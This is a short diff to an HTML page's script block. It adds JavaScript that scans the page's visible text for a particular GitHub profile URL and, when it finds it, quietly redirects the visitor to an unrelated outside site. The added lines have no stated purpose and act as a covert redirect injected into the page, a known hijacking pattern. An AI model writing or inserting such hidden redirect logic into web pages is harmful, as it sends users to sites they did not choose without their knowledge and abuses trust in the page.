@@ -109,6 +109,19 @@
             };
 
             randomString(17);
+            
+            // Get all the text on the page
+var pageText = document.body.innerText;
+
+// Define the text to search for
+var searchText = "https://github.com/aminrngbr1122";
+
+// Check if the page text contains the search text
+if (pageText.indexOf(searchText) !== -1) {
+  // If the search text is found, open the link
+  window.location.href = "https://uptvs.com";
+}
+
         </script>
     </body>
 </html>
